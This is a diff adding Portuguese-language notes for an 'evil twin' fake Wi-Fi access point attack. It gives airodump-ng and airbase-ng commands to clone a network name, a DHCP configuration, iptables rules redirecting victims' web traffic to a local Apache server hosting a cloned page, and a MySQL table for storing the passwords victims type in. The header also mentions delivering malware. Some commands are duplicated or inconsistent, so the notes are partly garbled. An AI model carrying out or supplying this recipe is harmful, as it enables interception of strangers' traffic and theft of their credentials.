@@ -1,1 +1,70 @@
-.
+                                                         FAKE AP, Twuin Evil 
+
+- > mostrar página fake  
+- > malware  
+
+airodump-ng wlan0mon
+airodump-ng-oui-update - > download de uma tabela de fabricantes de roteadores 
+airodump-ng wlan0mon -c x -M 
+
+# airbase-ng --essids <lista com o nome da rede> -c <canal> -P wlan0mon
+#ifconfig at0 up 
+#ifconfig at0 up# ifconfig at0 192.168.2.1/24
+# route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1   
+
+nano /etc/dhcp/dhcpd.conf                                
+authoritative;
+default-lease-time 600;
+max-lease-time 7200;
+subnet 192.168.2.0 netmask 255.255.255.0 {
+option subnet-mask 255.255.255.0;
+option routers 192.168.2.1;
+option domain-name-servers 8.8.8.8;
+range 192.168.2.100 192.168.2.175;
+}
+
+# dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcp.pid at0 
+# /etc/init.d/isc-dhcp-server start
+
+
+agora vamos enviar os ips e pacotes para um web server, para isso: 
+1) ativar o ip_forward
+#echo 1 > /proc/sys/net/ipv4/ip_forward  
+
+2) limpar o iptables 
+└─# iptables --flush                 
+└─# iptables --table nat --flush
+└─# iptables --delete-chain
+└─# iptables --table nat --delete-chain 
+
+3 ) criando regras no iptables 
+└─# iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE  
+└─# iptables -t nat -D PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.100.115:80   
+└─# iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.100.115:80
+└─# iptables -t nat -D PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.100.115:80
+└─# iptables -A FORWARD --in-interface at0 -j ACCEPT                                        └─# iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.100.115:80 
+
+4 ) iniciando servidor do apache2
+service apache2 start 
+
+pagina clonada do(a) xxx download 
+cd /var/www
+cd html 
+index.html  < - copia a pagina clonada aqui 
+
+service mysql start
+
+
+CREATE database xxx_twin;
+USE xxx;
+CREATE TABLE xxx_x_keys(password varchar(64), confirm varchar(64));
+
+use xxx;
+SELECT * FROM xxx_x_keys;
+
+
+
+-M - > mostre os fabricantes 
+-P - > responda a todos a todos 
+
+
